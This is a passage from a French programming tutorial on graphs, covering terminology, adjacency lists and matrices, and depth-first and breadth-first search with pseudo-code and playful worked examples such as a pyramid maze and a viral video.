et les arêtes par des routes , on obtient le graphe utilisé par les GPS ou Google Map par exemple. On utilise couramment le terme anglais pathfinding pour désigner la recherche de chemins dans un graphe. Des relations entre individus Cet outil est très utilisé en sciences sociales pour représenter des individus et leurs différents liens . On en fait usage dans le milieu de la recherche, mais aussi dans les réseaux sociaux. L'objectif va être de pouvoir identifier les communautés formées, les centres d'intérêt communs... Une exploitation intelligente de ces données est indispensable pour suggérer à l'utilisateur les choses qu'il est susceptible d'aimer, les personnes qu'il connaît peut-être, et avant tout (et surtout) pour créer des publicités ciblées adaptées à chacun. Une anecdote à ce sujet : en moyenne seules 8 personnes vous séparent de n'importe quelle autre personne à la surface de la Terre. Si vous prenez la connaissance de la connaissance etc... d'une de vos connaissances, en moyenne 8 personnes permettront de vous connecter avec n'importe quel français, américain, indien ou japonais. Et il est rare de dépasser 11 ou 12. Il s'agit là du diamètre moyen du graphe social de l'humanité. L'ordonnancement de tâches : le tri topologique Les problèmes d'ordonnancement de tâches sont toujours un sujet de recherche active aujourd'hui. On peut représenter chacune des tâches à effectuer par un nœud, et les dépendances entre chacune des tâches par les arêtes. Ainsi, l'ordre dans lequel on enfile chaussettes et pantalon importe peu, mais il faut que les deux soient mis avant de lacer ses chaussures. De la même façon, on peut installer les câblages électrique et téléphonique dans l'ordre de notre choix, mais il faut que les murs soient construits avant ! On résout ce problème avec un tri topologique . Minimiser l'usage de ressources avec les arbres couvrants minimaux En parlant de câblage, vous souhaitez que toutes vos prises soient reliées au secteur, non ? Cela est simple ! Mais le fil électrique coûte cher au mètre et vous souhaitez minimiser le prix de votre installation. Ainsi, vous associerez un nœud à chaque prise , et une arête à chaque fil qu'il est possible (mais pas nécessaire) d'installer. A vous de choisir l'ensemble de câbles les plus courts pour relier toutes les prises ! Cela correspond à la recherche de l'arbre couvrant minimal . Ici l'ensemble de fils les plus courts est colorié en rouge. Tromper votre ennui en géographie en coloriant des cartes Vous vous ennuyez à mourir en géographie. Comme vous êtes un individu froid et austère, mais aussi efficace, économe et démuni, vous souhaitez colorier cette triste carte en utilisant un minimum de couleurs, et en faisant en sorte que deux pays limitrophes ne soient jamais de la même couleur. Il s'agit du problème de coloration de graphe . Pour une carte en 2D ne cherchez plus : la réponse est 4, mais ce n'est pas le cas de tout les graphes... en effet, dans un carte, chaque pays est un nœud, et les arêtes correspondent au frontières communes . Poster du courrier Vous êtes le facteur d'un petit village, vous distribuez le courrier à vélo, à la seule force de vos jambes. Vous devez passer devant toutes les maisons du village, ce qui implique de traverser toutes les rues. Mais soucieux de préserver vos forces et de renouveler continuellement votre découverte des paysages, vous ne voulez pas traverser deux fois la même rue. Ici chaque nœud est un carrefour , et chaque arête une rue . Vous êtes en train de chercher un circuit Eulérien ! Il doit son nom à Leonhard Euler, qui chercha à savoir s'il était possible de franchir les 7 ponts de Königsberg sans jamais repasser deux fois sur le même (et en ne traversant le fleuve que grâce aux ponts, bien entendu). ...et tout le reste ! Pensez à Youtube qui suggère des vidéos proches de celle que vous regardez (d'aucun prétendent qu'on finira toujours par aboutir à des vidéos de chats), pensez à wikipédia qui propose des articles connexes (nous reviendrons sur ce terme), pensez au cerveau humain, à ses milliards de neurones et à ses centaines de milliards de connexions entre eux ! Les graphes sont partout. Apprenez à reconnaître un problème de graphe lorsque vous en voyez un, c'est déjà la moitié du travail. Il ne vous reste alors plus qu'à trouver l'algorithme qui répond à votre problème ! Un peu de vocabulaire Quelques conventions et notations... Maintenant que nous avons une idée de ce qu'est un graphe, tâchons d'employer un vocabulaire précis pour traiter de chacune de ses caractéristiques. Certains algorithmes ne fonctionnent que sur des graphes possédant certaines particularités. Pouvoir décrire en quelques mots les caractéristiques principales d'un graphe est donc indispensable, et vous devez toujours avoir le réflexe de le faire sitôt le graphe identifié. Cela vous guidera vers le choix de l'algorithme approprié. Fixons d'ores et déjà quelques notations, par soucis de clarté. Ces notations sont conventionnellement utilisées dans la plupart des cours ou articles parlant de graphes. L'ensemble des nœuds du graphe est désigné par $N$. L'ensemble des arêtes est désigné par $A$. Le graphe $G$ est simplement défini comme $G = (N,A)$. Ainsi, la représentation du graphe importe peu : les deux graphes ci-dessous sont isomorphes (ici, on peut traduire grossièrement ce terme barbare par équivalents ). Graphe simple ou multigraphe Une boucle est une arête qui relie un nœud à lui même. Un lien double caractérise l'existence de plusieurs arêtes entre deux nœuds donnés. Un graphe possédant l'une ou l'autre de ces caractéristiques est dit multigraphe . Un graphe ne possédant aucune des deux est dit graphe simple . Nous travaillerons exclusivement sur des graphes simples par soucis de simplicité : ils couvrent la plupart des utilisations, et sont plus simples à traiter que les multigraphes dans le cas général. Connexité Un graphe est dit connexe lorsqu'il existe un chemin entre toute paire de nœuds. Une composante connexe d'un graphe est un sous-graphe connexe de ce graphe. Ainsi, sur le dessin ci-dessous, vous ne voyez qu'un seul et unique graphe , comportant 3 composantes connexes. ​ Graphes orientés et non-orientés Voici une autre caractéristique fondamentale d'un graphe. Dans un graphe orienté les arêtes sont à sens unique . On les représente donc avec une flèche sur les dessins. D'ailleurs, le terme employé n'est plus arête, mais arc . Cette distinction est importante, car nombre d'algorithmes ne fonctionnent tout simplement pas sur des graphes orientés. Notez bien que cela n'empêche en rien que deux nœuds puissent être reliés dans les deux sens : il suffit d'utiliser deux arcs, chacun dans un sens (cela ne rompt pas la condition de graphe simple). Graphes pondérés Dans un graphe pondéré les arêtes (ou les arcs) sont, ben, pondérés , quoi. Autrement dit, on associe une valeur à chaque arête. Elles peuvent très bien être négatives. Cela peut-être une distance : lorsque que l'on cherche un plus court chemin entre deux nœuds, il va de soit que la somme des pondérations des arêtes doit être aussi petit que possible. Mais ça peut aussi être un réel dans $[0;1]$ pour désigner des probabilités dans les chaînes de Markov par exemple. Cela peut aussi être un score, un prix, etc. N'importe quelle quantité qui peut vous passer par la tête ! Graphes cycliques Un graphe cyclique comporte au moins un cycle . Un cycle est un chemin qui permet de relier un nœud à lui même, sans jamais passer deux fois par la même arête. La détection de cycles est d'ailleurs un problème récurrent en informatique, notamment lorsqu'on s'intéresse aux dépendances d'un fichier ou d'un programme : A requiert B , B requiert C , et C requiert A est un cas de dépendances cyclique habituel. Les graphes ne possédant pas de cycles dont dit acycliques . Il existe un sous-ensemble remarquable de graphes acycliques : les DAG (pour Directed Acyclic Graph ); ce sont des graphes acycliques orientés. Les algorithmes dynamiques (nous verrons ça plus tard) ne peuvent travailler que sur des DAG. Densité d'un graphe et degré d'un nœud La densité d'un graphe correspond au rapport du nombre d'arêtes sur le nombre total d'arêtes possibles . C'est donc un réel compris entre $0$ et $1$. Cette caractéristique influe sur le choix de sa représentation. Une densité de $0$ correspond à un graphe sans arêtes où tout les sommets sont isolés. Une densité de 1 correspond à un graphe complet : chaque nœud est relié à chaque autre nœud. Ci-dessous le graphe complet à 9 nœuds. Dans un graphe simple orienté de $N$ nœuds, chaque nœud ne peut être relié qu'à ses $N-1$ voisins au maximum, soit un total de $N(N-1)=N&#94;2-N$ arcs. Et $\\frac{N&#94;2-N}{2}$ arêtes dans le cas d'un graphe non orienté. Le degré d'un nœud correspond au nombre d'arêtes reliées à ce nœud. Dans le cas d'un graphe orienté, le degré entrant d'un nœud est le nombre d'arcs qui aboutissent à ce nœud, et le degré sortant le nombre d'arcs qui partent de ce nœud. De façon générale, lorsque le nombre d'arêtes d'un graphe est de l'ordre de $N$, le graphe est dit creux . Le degré moyen de ses nœuds est une constante. A l'inverse, lorsque le nombre d'arêtes est de l'ordre de $N&#94;2$, le graphe est dit dense : le degré moyen de ses nœuds est de l'ordre de $N$. Arbre Un graphe est un arbre s'il vérifie les propriétés suivantes : il est acyclique , non orienté , et connexe . De cela il découle qu'il n'existe qu'un et un seul chemin entre deux nœuds donnés (c'est vraiment très pratique, je vous l'assure !). Attardons sur quelques évidences. Un arbre possède une seule et unique racine . Il relié à d'autres nœuds - ses fils - par des branches (le terme arête demeure correct toutefois). Tout les nœuds peuvent posséder 0, 1 ou plusieurs fils. En revanche, ils possèdent tous un seul et unique père , à l'exception de la racine qui n'en a pas. Les feuilles sont caractérisées par l'absence de fils. Un dessin pour mieux comprendre tout ce fouillis : Comme vous pouvez le voir, les nœuds correspondent à des embranchements. Si on part d'un nœud et qu'on descend de fils en fils, on aboutira nécessairement à une feuille. Et si on remonte de père en pères, on aboutit à la racine (et dire qu'il y a encore des gens qui doutent du créationnisme !). Si le graphe n'est pas connexe mais qu'il possède les propriétés cités ci-dessus, alors chacun des sous-graphes connexes est un arbre, et l'ensemble forme une forêt (ben oui, un ensemble d'arbres c'est une forêt). Représentations et stockage en mémoire Généralités Maintenant, cher lecteur, nous avons une idée bien plus précise de ce qu'est un graphe. Mais il n'est pas destiné à rester un outil purement théorique ! Il faut pouvoir résoudre des problèmes avec, et donc implémenter des algorithmes qui travaillent dessus. Nous devons donc trouver une structure de données adaptée pour le stocker, qui soit économe en mémoire, et qui permette aux algorithmes de l'exploiter rapidement. Chaque nœud est stocké dans un tableau, une liste, ou n'importe quelle autre structure de données plus complexe (aucune contrainte particulière à ce propos, à vous de choisir la plus adaptée). Il est composé de propriétés , comme par exemple une position , une lettre , une valeur ou n'importe quelle entité plus complexe, qui dépend du problème (au cas par cas). La difficulté consiste donc à lister intelligemment les arêtes entre les nœuds. On résout ce problème avec une liste d'adjacence ou une matrice d'adjacence . La quasi totalité des implémentations d'un graphe sont des variantes de ces deux structures de données. Attention ! La liste et la matrice ne sont pas seulement des structures de données, elles sont aussi une représentation du graphe . La matrice et la liste contiennent suffisamment d'informations pour définir le graphe, au même titre que la représentation géométrique à base de sommets et d'arêtes. Mais contrairement à cette dernière, qui est plus intuitive et plus adaptés aux êtres humains, la matrice et la liste peuvent être aisément implémentées sous forme de structure de données et utilisées par un programme. La liste d'adjacence La liste d'adjacence est le moyen le plus répandu pour stocker un graphe en mémoire : elle correspond à la représentation intuitive que l'on s'en fait. La liste d'adjacence d'un nœud est la liste de ses voisins (ou la liste des arêtes qui le relie à ses voisins). struct Noeud { proprietes voisins [] } Noeud noeuds [] = graph Fin de la théorie. Passons à la pratique : vous pouvez avoir, selon ce que vous propose votre langage, plusieurs moyens de stocker la liste des voisins. 1) Des indices et un tableau C'est la façon la plus naturelle, et la plus triviale. Vous mettez tout vos nœuds dans un tableau, et la liste d'adjacence de chaque nœud contient l'indice de ses voisins. En raison de sa simplicité et de son expressivité, c'est l'implémentation qui sera utilisée dans la suite du tutoriel. Voici un moyen d'itérer sur tout les voisins du nœud indexé par courant . Pour chaque voisin V dans noeuds[courant].voisins faire quelque chose avec noeuds[V] Le facteur constant d'accès à chaque voisin est très faible, ce qui vous permet de vous \"promener\" très rapidement dans le graphe. Vous pouvez généralement obtenir de très bonnes performances de cette façon. Le seul inconvénient de cette méthode est de devoir disposer de l'intégralité du graphe dans la mémoire. Problématique si vos ressources en mémoire sont limitées, ou si pire, le graphe est de taille infinie ! Cela impose également que vous connaissiez dès le début l'ensemble du graphe, ce qui n'est pas toujours le cas : il en résulte une représentation figée qui interdit toute modification de certaines données (nombre de nœuds... ), et se limite à leur simple exploitation (ce qui demeure suffisant pour la plupart des algorithmes, en particulier tout ceux que nous étudierons). 2) Des hash et une table de hashage Il s'agit de la version adaptée de l'implémentation précédente, pour palier à son principal défaut. Tout les nœuds que vous connaissez déjà sont stockés dans une table de hachage, et la liste d'adjacence de chaque nœud contient le hash de ses voisins. C'est généralement l'implémentation idéale pour un graphe dans lequel les arêtes entre chaque nœud sont définies par des règles précises, et non pas de manière purement arbitraire. Prenons l'exemple du jeu d'échecs : en associant à un nœud à chaque position, on constate que les arêtes correspondent à chaque coup légal qui mène à une position légale elle aussi (le milieu des jeux de stratégie semble très policé). Ainsi, pour chaque nœud, on peut facilement lister ses voisins. ​ Il n'est pas possible de stocker autant de nœuds que de configurations du plateau : il en existe de l'ordre de $10&#94;{50}$ ! Mais ce n'est pas un problème : jouer une partie revient à se promener dans ce graphe (c'est d'ailleurs un arbre), et il n'est en rien nécessaire d'énumérer tout les nœuds pour cela. Le principal défaut de cette implémentation est le calcul des hashs : cela se fait en $O(1)$ en temps mais avec un facteur constant très important. 3) Des pointeurs Cette implémentation est à réserver aux langages qui supportent ce concept (langages bas-niveaux essentiellement). La liste d'adjacence contient des pointeurs vers chaque nœud voisin. Chaque nœud est alloué dynamiquement. Cela permet une représentation très souple du graphe : ajout et suppression de nœuds, et d'arêtes. Pour reprendre un précédent exemple : sur des réseaux sociaux des comptes peuvent être supprimés ou ajoutés, et on peut \"aimer\" ou \"ne plus aimer\" certaines choses, etc... Cependant, la construction du graphe et son exploitation n'est pas facile : cette implémentation sujette aux bugs est à réserver aux cas dans lesquels elle est absolument nécessaire. Conclusion Voici quelques caractéristiques remarquables de la liste d'adjacence : Complexité en mémoire : $O(N+A)$ Complexité en temps pour itérer sur tout les voisins d'un nœud : $O(d)$ avec $d$ le degré sortant du nœud Ajout d'arête : $O(1)$ Retrait d'arête : $O(d)$ car il faut la retrouver avant de la supprimer Tester si deux nœuds sont voisins : $O(d)$ car il faut itérer naïvement sur toutes les arêtes de l'un des deux nœuds Variante : Plutôt que d'utiliser une liste, vous pouvez utiliser un arbre binaire de recherche équilibré : Ajouts et retraits d'arêtes en $O(\\log{d})$ Tester si deux nœuds sont voisins en $O(\\log{d})$ En effet les opérations pour retrouver les arêtes sont plus rapides, mais en contre-partie leur ajout est plus long. Cette optimisation n'est raisonnablement valable que lorsque le degré des nœuds devient important (en particulier, en dessous de 8 les gains sont souvent invisibles, mais des tests s'imposent en toutes circonstances, ne faites pas de cette indication une généralité !). N'oubliez pas que la construction du graphe au préalable nécessite un ajout des arêtes une à une, soit ici une construction du graphe en $O(N)$ contre $O(N\\log{N})$. Choisissez l'implémentation la plus adaptée à votre problème, faites un compromis, ou inventez en d'autres... La matrice d'adjacence La matrice d'adjacence est un tableau en deux dimensions. Chacune des dimensions est indexée par les nœuds du graphe (typiquement de $0$ à $N-1$). A l'intersection de chaque ligne et colonne on trouve un nombre : il vaut 1 si une arête relie les deux nœuds indexés par les coordonnées de la case, et 0 sinon. On observe plusieurs choses intéressantes. Les boucles reliant un nœud à lui même sont sur la diagonale de la matrice. Cette matrice est symétrique par rapport à sa diagonale dans un graphe non-orienté (puisque si A est relié à B , alors B est relié à A ). Si le graphe ne comporte aucune arête, alors c'est la matrice nulle. Si le graphe est creux, alors la matrice le sera aussi. Pour $N$ nœuds, cette matrice est de taille $N\\times N$. Soit une complexité de $O(N&#94;2)$ en mémoire. Si votre langage le permet, vous pouvez stocker chacun des booléens sur un bit; il en résulte une consommation en mémoire de $\\frac{N&#94;2}{8}$ octets exactement, ce qui est très compact (incompressible dans le cas général). Vous pouvez itérer sur tout les voisins d'un nœud en $O(N)$ En outre, à tout moment vous pouvez déterminer si deux nœuds sont voisins (c'est à dire reliés par une arête) en $O(1)$ Pour finir les ajouts et retraits d'arêtes se font en $O(1)$ Si cette représentation est couteuse pour un graphe creux (on lui préférera la liste d'adjacence), elle devient très rentable pour un graphe dense. La densité est souvent le critère décisif du choix entre la matrice ou la liste. Si le graphe est pondéré, vous pouvez remplacer les booléens par des nombres correspondant à la pondération de chaque arête. Et vous fixez une valeur spéciale pour signifier l'absence d'arête ($-1$, $0$ ou $\\infty$ par exemple, selon les cas). Les matrices d'adjacence sont particulièrement usitées lors de démonstrations sur un graphe, car la matrice est un outil mathématique bien connu. Parcourir un graphe C'est bon ? Vous avez un graphe joli tout plein ? Il attend sagement dans la RAM que vous vous occupiez de lui ? Vous êtes ici pour pouvoir - enfin ! - programmer vos premiers algorithmes de graphe. Vous allez apprendre à explorer la bébête, avec le DFS , le BFS et l'exhaustif. Et avec la foultitude d'exemples que je vous donnerais, je vous jure que vous ne tarderez pas à découvrir le nombre incroyable de problèmes que ces simples algorithmes résolvent. Préparez vous à plonger profondément 1 dans l'univers des graphes. Le parcours en profondeur et le labyrinthe Les pyramides Aaaah l'Egypte ! Le soleil, le sable, le Nil ! Le Sphinx et son nez ! Les pyramides, leurs labyrinthes, et leurs... euh... labyrinthes. Fidèle à la tradition familiale vous êtes devenu un pilleur de tombeaux. Vous n'êtes pas sans ignorer que la chambre funéraire recèle maints trésors, que vous avez hâte de vous approprier afin d'ouvrir le magasin de guimauve dont vous rêvez depuis votre enfance. Sauf qu'aujourd'hui vous êtes tombé sur une pyramide très particulière, avec de nombreux carrefours... mais certains mènent à des pièges abominables, tellement abominables que je n'ose pas les décrire ici ! Vous disposez d'une carte du labyrinthe (remettant ainsi en cause l'utilité de ce dernier). Soucieux de ne pas prendre de risques superflus, vous confiez à votre ordinateur la dure tâche de trouver un itinéraire fiable. Voici le plan : Exercice : trouvez le graphe associé à ce problème. Trouvez ses caractéristiques principales. Trouvez quelle question on se pose sur ce graphe. Puis choisissez la structure de données qui vous semble la plus appropriée à la résolution du problème ! Commençons par le graphe. Il apparaît clairement que chaque couloir est une arête. Par conséquent les nœuds seront des intersections . Certains nœuds sont particuliers. Les entrées du labyrinthe : c'est de l'une d'entre elles que commence le chemin. La chambre funéraire : c'est l'aboutissement d'un chemin (s'il existe). Les salles piégées posent problème : elles existent mais nous ne pouvons pas les traverser. Deux solutions. Soit on ajoute ces nœuds particuliers au graphe, en précisant bien qu'ils sont piégés pour que l'algorithme les ignore (compliqué et désagréable à implémenter, plein de cas particuliers à gérer). Soit on les ignore purement et simplement lors de la construction du graphe, comme s'ils n'en faisaient pas parti (plus simple, plus propre). Nous choisirons donc la seconde solution. Et retenez de cela qu'il ne faut pas s'encombrer de superflu (un sérieux coup de pied dans les fesses de la société de consommation, pas vrai ?), la simplicité, l'expressivité et la concision sont les mots d'ordre du développeur. Cela vous évitera de tristes après-midis de débogage. Passons aux caractéristiques du graphe. Ce graphe est non orienté : vous pouvez traverser un couloir dans les deux sens, et même sur les mains si ça vous plaît. Ce graphe est cyclique , car certains itinéraires tournent en rond ( ah les fourbes ! ). Ce graphe n'est pas pondéré . Certains objecteront qu'on peut associer à chaque couloir sa longueur, le coefficient de dureté du sol, l'âge de sa construction ou que sais-je encore. C'est vrai. Sauf qu'on s'en fout. On est pas ici pour trouver le chemin le plus respectueux pour vos pieds, donc ne nous encombrons pas de ces broutilles. Pas de superflu. Ce graphe n'est pas connexe : vous ne pouvez pas accéder à n'importe quel endroit depuis n'importe quel autre endroit. On dénombre 2 composantes connexes d'ailleurs. Ce graphe est creux : on a seulement 17 arêtes pour 18 nœuds (après suppression des nœuds piégés et des couloirs qui leur sont associés). On choisira donc la liste d'adjacence pour stocker ce graphe ! Pour finir voici la question que l'on se pose. Existe-t-il un chemin entre une entrée et la chambre funéraire ? Autrement dit, la chambre funéraire est-elle connexe à au moins une entrée ? Quel est ce chemin (ou l'un de ces chemins) ? Le parcours en profondeur Le DFS est la méthode la plus simple pour parcourir un graphe. Elle fonctionne sur tout type de graphe, cyclique ou non,orienté ou non, etc. En langage naturel ça donne : je pars d'un endroit que je ne connais pas, je me dirige vers d'autres endroits que je ne connais pas, et quand je suis bloqué je fais demi-tour jusqu'à retrouver un chemin que je n'ai pas encore parcouru . Assez instinctif pas vrai ? C'est la méthode que l'on utilise lorsqu'on est perdu, ou lorsqu'on visite un bâtiment : on essaie plusieurs chemins, et lorsqu'on est coincés on fait demi-tour jusqu'à la précédente intersection. Voici sa description sous forme d'algorithme : 1) Je cherche un nœud non visité. 2) Pour visiter ce nœud, je marque le nœud comme visité. 3) Je prends l'un de ses voisins : si le voisin a déjà été visité je l'ignore et je cherche un autre voisin si le voisin n'a pas encore été visité, je le visite si tout les voisins ont été visité, je reviens au nœud précédent, et je ré-applique le 3) 4) Je reprend le 1) tant qu'il reste des nœuds non visités Vous avez remarqué ? Une boucle (de 4 à 1 ) englobe la totalité de l'algorithme. Cette condition d'arrêt ( tant qu'il reste des nœuds non visités ) nous assure que l'entièreté du graphe sera exploré. Il n'y a pas que ça : pour visiter un nœud, il faut aussi visiter l'un de ses voisins non visité. Un concept qui se renvoie à lui même pour se définir, ça ne vous fait penser à rien ? Mais si, la récursivité bien sûr ! Passons au pseudo-code. Procedure explorer(Graphe G) { Pour chaque noeud N de G Si N non visite DFS(G, N) } Procedure DFS(Graphe G, Noeud N) { Marquer N comme visite Pour chaque voisin V de N Si V non visite DFS(G, V) } Remarquez une chose : la fonction explorer fera autant d'appels à DFS qu'il existe de composantes connexes distinctes, dans un graphe non orienté. Le DFS est donc un bon moyen de retrouver les composantes connexes d'un graphe non orienté. Si nous ne marquions pas les nœuds comme étant visités, nous nous mettrions à tourner en rond, dans le cas d'un graphe cyclique. Cela entraînerait donc des appels récursifs infinis, et notre programme ne se terminerait jamais ! Pour cette raison, le DFS est l'algorithme le plus adapté à la détection de cycles. Vous comprenez maintenant l'origine du nom DFS : l'algorithme descend en profondeur dans le graphe, avant de faire demi-tour. Sur le graphe ci-dessous l'ordre d'exploration pourra donc être : A - B - D - F - E - C - G Voyons le problème sous un autre angle, et dessinons les arêtes empruntées par le DFS : Cela ne vous fait penser à rien ? C'est un arbre ! En effet, ce graphe ne comporte pas de cycles (puis que le DFS ne doit pas boucler). Et on s'aperçoit que le DFS , de nature récursive, se prête bien au parcours de cette structure de données récursive : pour explorer un arbre, on explore sa racine puis les sous-arbres qui le composent. Jetons un petit coup d'œil à la complexité en temps de cet algorithme. On remarque que chaque nœud ne sera traité qu'une seule fois, et on a tôt fait de conclure (à tort) qu'il est en $O(N)$. Sauf que... pour chaque nœud, on itère sur tout ses voisins (qu'un appel récursif soit fait dessus ou non). D'où une complexité en temps de $O(N+A)$. On voit donc ici que le nombre de nœuds est fonction - de façon assez évidente - de la vitesse d'exécution, mais que la densité du graphe a elle aussi un rôle très important. La complexité en mémoire dépend du nombre d'appels récursifs (qui font grossir la pile), et il peut y en avoir autant que de nœuds dans le graphe. La complexité en mémoire est donc $O(N)$. Le pire des cas correspond à un graphe sous la forme d'une liste de nœuds chaînés les uns à la suite des autres, là où la profondeur d'appel est maximale. Le DFS tel que je vous l'ai présenté ici est assez \"nu\" mais il va sans dire qu'avec quelques modifications il est en mesure de résoudre un grand nombre de problèmes (ici déterminer si deux nœuds sont sur la même composante connexe). Nous verrons cela dans les chapitres suivants. Que le DFS soit de nature récursive est autant un avantage qu'un inconvénient. Un avantage car beaucoup plus simple à lire, à écrire et à déboguer (lorsqu'on est à l'aise avec la récursivité). Mais un inconvénient car chaque appel récursif fait grossir la pile d'appel, qui possède une taille limitée dépendant de votre langage, de votre OS et de votre compilateur/interpréteur (souvent 1000 mais n'en faites pas une généralité). Si votre graphe est trop gros vous pourriez rencontrer d'importants problèmes de mémoire. La solution consiste à ré-implémenter le DFS en itératif en simulant la pile d'appel grâce à une pile LIFO ( Last In First Out ). Luke, je suis ton père Normalement, vous disposez d'assez d'informations pour résoudre le problème à présent. Il suffit de modifier un peu la fonction DFS . Ne regardez pas la solution avant d'avoir bien cherché ! Bon, récapitulons : si ce chemin existe, après l'avoir parcouru, il faut savoir le retrouver. Remarquons deux choses : ce chemin, quel qu'il soit, reste le même quelque soit le sens dans le quel on l'emprunte; en outre, chaque nœud n'est visité qu'une et une seule fois, donc il n'existe qu'un seul moyen de parvenir à lui dans le DFS . C'est directement en lien avec l'observation de tout à l'heure : le DFS explore un arbre, donc chaque nœud n'a qu'un seul père. Il suffit donc de remonter dans l'arbre, depuis la chambre funéraire jusqu'à la racine (c'est à dire le premier appel à la fonction DFS sur cette composante connexe). Et pour cela rien de plus simple : il faut que chaque nœud retienne qui est son père. Fonction trouverChemin(Graphe G) { Pour chaque noeud N de G pere[N] = NUL explorer(G) Noeud chemin[] Noeud courant = chambreFuneraire Tant que courant != NUL // == Tant qu'on est pas sorti chemin.ajouter(courant) courant = pere[courant] Renvoyer inverse(chemin) // car le chemin est reconstruit à l'envers } Procedure explorer(Graphe G) { Pour chaque noeud N de G Si N non visite et N est une entree pere[N] = NUL DFS(G, N) } Procedure DFS(Graphe G, Noeud N) { Marquer N comme visite Pour chaque voisin V de N Si V non visite pere[V] = N DFS(G, V) } Si ce chemin existe il sera trouvé. Sinon, la fonction trouverChemin renverra la liste singleton [NUL] pour signifier l'absence de chemin. Ci-dessous, un exemple de solution (pas forcément la plus courte). Et voilà ! Vous avez trouvé votre chemin. Mais n'oubliez pas : il y a une différence entre connaître le chemin et arpenter le chemin . Le parcours en largeur et le buzz Big Buzz Vous venez d'achever l'œuvre de votre vie : une vidéo si stupide qu'elle va rencontrer un succès incroyable. Elle va faire le buzz , vous le savez : quiconque la voit ne pourra pas s'empêcher de la partager juste après. Personne n'y échappera, subjugué par tant de bêtise humaine. Vous voulez suivre la progression de votre création sur le net, et en particulier vous souhaitez savoir combien de personnes en tout ont visionné votre vidéo au bout d'un certain nombre d'heures. Vous êtes ami avec un employé de la NSA, ce qui vous permet d'obtenir une carte très détaillée de votre réseau social préféré, où vous voyez les liens entre chaque individu. Sitôt qu'un individu voit la vidéo, il la partage. Tous ses contacts la voient très exactement une heure après, puis la partagent immédiatement à leur tour, etc. Vous êtes le point d'émission de la vidéo à l'heure 0, qui ira vers vos amis, puis les amis de vos amis... A partir du réseau social, vous souhaitez obtenir la liste triée des gens l'ayant vue, en fonction de l'heure. Quel est le graphe ? Bon là c'est assez explicite, un nœud pour chaque individu , et une arête pour chaque relation entre deux individus . Ce graphe est cyclique , non orienté (l'amitié marche dans les deux sens normalement, mais si vous préférez un système avec des followers ce sera un graphe orienté), non pondéré , et creux (sauf quand tout le monde connait tout le monde, mais c'est rare). On va donc, une fois de plus, utiliser une liste d'adjacence. On veut obtenir la liste des nœuds en fonction de leur distance à un nœud particulier, le vôtre . Le parcours en largeur Le BFS est l'algorithme qui permet de parcourir tout les nœuds en fonction de leur distance à l'origine. Il explore les cartes par cercles concentriques de plus en plus grands. Il fonctionne sur tout type de graphe, cyclique ou non, orienté ou non, etc. Le BFS procède de la façon suivante : il prend le premier nœud (distance 0), puis traite tout les nœuds qui sont à une distance de 1, puis tout les nœuds à une distance de 2, puis tout les nœuds à une distance de 3... et ainsi de suite. On remarque très vite que les nœuds à une distance 1 de l'origine sont ses voisins, à une distance de 2 ce sont les voisins de ses voisins, à une distance 3 les voisins des voisins de ses voisins... de manière générale, un nœud à distance $n$ est : soit relié à des nœuds de distance $n-1$, soit des nœuds de distance $n$, soit des nœuds de distance $n+1$. Certainement pas plus : sinon il existerait un moyen plus rapide de rejoindre le nœud suivant; certainement pas moins, sinon le nœud courant aurait pu être atteint plus rapidement. Si nous disposons de tout les nœuds à distance $n$, nous avons accès à tout les nœuds de distance $n+1$. Dès le début on a accès au nœud de distance 0, donc en appliquant itérativement ce procédé on aura accès à tout les nœuds en fonction de leur distance à l'origine (s'ils sont connexes à elle). Si vous ignorez ce qu'est une file FIFO, il n'est pas trop tard ! Voici l'algorithme : 1) Je prend le premier nœud de la file d'attente des nœuds à traiter. 2) Pour visiter ce nœud je le marque comme visité. 3) Je prend chacun de ses voisins non visités et je les ajoute à la fin de la file d'attente des nœuds à visiter 4) Je reprends le 1) tant qu'il reste des nœuds à traiter dans la file d'attente Voici le pseudo code correspondant : Procedure BFS(Graphe G, Noeud Origine) { File aTraiter Marquer N comme visite aTraiter.enfiler(Origine) Tant que aTraiter.nonVide() { Noeud N = aTraiter.defiler() Pour chaque voisin V de N Si V non visite Marquer V comme visite aTraiter.enfiler(V) } } Cet algorithme fonctionne, je vous le promet ! Il commence par enfiler l'origine à distance 0, puis tout les nœuds 1, puis pour chaque nœud à distance 1 il va enfiler d'autres nœuds à la distance 2 (à la suite des nœuds à distance 1 donc), puis il défilera les nœuds à distance 2 pour enfiler des nœuds à distance 3 à leur suite. Ainsi les nœuds ne sont jamais mélangés : ils sont présents dans la file par \"paquets\" consécutifs qui correspondent à leur distance à l'origine. Sur un arbre, il explore les nœuds en fonction de leur hauteur (distance à la racine) contrairement au DFS qui va effectuer toutes les descentes possibles de la racine à une feuille. Ainsi, l'ordre d'exploration des nœuds du graphe ci-dessous pourra être : A - B - C - E - D - F - G . Comme vous pouvez le constater, tout les nœuds frères sont parcourus les uns à la suite des autres, la racine étant l'origine du BFS . Et que se passera-t-il si d'aventure nous remplacions la file par une pile ? On retrouve la version itérative du DFS présentée à la section précédente ! Il apparaît donc qu'il y a un lien important entre algorithme et structure de données. L'écriture sous forme itérative ou récursive dépend essentiellement de facteurs comme la lisibilité, la manière de laquelle l'algorithme s'explique le mieux, et enfin les performances. Tout comme pour le DFS , la complexité en temps est en $O(N+A)$. Une fois encore la densité du graphe influe beaucoup sur les performances de l'algorithme. La file peut contenir autant de nœuds que le graphe en possède, d'où une complexité en mémoire de $O(N)$. Le pire des cas concerne un graphe de diamètre très faible : la file est encombrée par la présence des nombreux nœuds à distance égale de l'origine. Le BFS peut servir à détecter les composantes connexes d'un graphe (tout comme le DFS ), si plusieurs appels à la fonction BFS() sont réalisés avec des origines différentes. Mais le BFS a un avantage sur le DFS lors de la recherche de composantes connexes : il trouve le plus court chemin entre ces deux nœuds (s'il existe) dans le cas d'un graphe non pondéré. Dans le cas d'un graphe implicite de taille infini (ou de très très grande taille) le DFS risque de s'engager dans une mauvaise voie dans le début et de s'y enfoncer trop profondément, voir à l'infini ! Impossible de déterminer en un temps raisonnable (ou un temps fini) un chemin entre deux nœuds connexes, alors que le BFS va explorer plusieurs chemins possibles à la fois, ce qui lui donne l'assurance de trouver un jour ce chemin. Pour cette raison les graphes implicites de grande taille sont souvent parcouru par un BFS plutôt qu'un DFS . Mais le BFS peut aussi servir à marquer les nœuds en fonction de leur distance à l'origine. C'est ce que nous allons voir tout de suite ! Le prix du succès Une petite modification suffit à la résolution du problème. Procedure BFS(Graphe G, Noeud Origine) { File aTraiter profondeur[Origine] = 0 Marquer Origine comme visite aTraiter.enfiler(Origine) Tant que aTraiter.nonVide() { Noeud N = aTraiter.defiler() Afficher : N.nom + 